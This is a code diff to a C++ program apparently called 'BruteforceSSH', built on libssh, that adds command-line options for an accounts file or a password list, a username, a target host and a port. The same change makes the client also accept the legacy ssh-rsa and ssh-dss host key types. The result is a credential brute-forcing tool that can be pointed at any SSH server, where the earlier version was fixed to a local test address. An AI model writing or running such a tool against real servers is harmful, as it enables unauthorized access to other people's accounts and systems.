@@ -1,3 +1,5 @@
+#include <cxxopts.hpp>
+
 #include <libssh/libssh.h>
 
 #include <fstream>
@@ -14,7 +16,7 @@ bool SSHConnect(const std::string &hostname, int port, const std::string &userna
     ssh_options_set(session, SSH_OPTIONS_HOST, hostname.c_str());
     ssh_options_set(session, SSH_OPTIONS_PORT, &port);
     ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
-    ssh_options_set(session, SSH_OPTIONS_HOSTKEYS, "ssh-ed25519");
+    ssh_options_set(session, SSH_OPTIONS_HOSTKEYS, "ssh-ed25519,ssh-rsa,ssh-dss");
 
     int rc = ssh_connect(session);
     if (rc != SSH_OK) {
@@ -82,8 +84,48 @@ bool SSHConnectPasswords(const std::string &filename, const std::string &usernam
     return false;
 }
 
-int main() {
-    SSHConnectAccounts("assets/accounts.txt", "127.0.0.1", 2222, 30);
-    // SSHConnectPasswords("assets/passwords.txt", "pi", "127.0.0.1", 2222, 30);
+int main(int argc, char *argv[]) {
+    try {
+        cxxopts::Options options("BruteforceSSH");
+
+        // clang-format off
+        options.add_options()
+            ("a,accounts", "Accounts file", cxxopts::value<std::string>())
+            ("p,passwords", "Passwords file", cxxopts::value<std::string>())
+            ("u,username", "Username", cxxopts::value<std::string>())
+            ("h,hostname", "Hostname", cxxopts::value<std::string>()->default_value("127.0.0.1"))
+            ("P,port", "Port", cxxopts::value<int>()->default_value("22"))
+            ("t,timeout", "Timeout (seconds)", cxxopts::value<int>()->default_value("30"))
+            ("help", "Print help");
+        // clang-format on
+
+        auto result = options.parse(argc, argv);
+
+        if (result.count("help")) {
+            std::cout << options.help() << std::endl;
+            return 0;
+        }
+
+        std::string hostname = result["hostname"].as<std::string>();
+        int port = result["port"].as<int>();
+        int timeout = result["timeout"].as<int>();
+
+        if (result.count("accounts")) {
+            std::string filename = result["accounts"].as<std::string>();
+            SSHConnectAccounts(filename, hostname, port, timeout);
+        } else if (result.count("passwords") && result.count("username")) {
+            std::string filename = result["passwords"].as<std::string>();
+            std::string username = result["username"].as<std::string>();
+            SSHConnectPasswords(filename, username, hostname, port, timeout);
+        } else {
+            std::cerr << "You must specify either an accounts file or a passwords file with a username." << std::endl;
+            std::cout << options.help() << std::endl;
+            return 1;
+        }
+    } catch (const cxxopts::exceptions::exception &e) {
+        std::cerr << "Error parsing options: " << e.what() << std::endl;
+        return 1;
+    }
+
     return 0;
 }
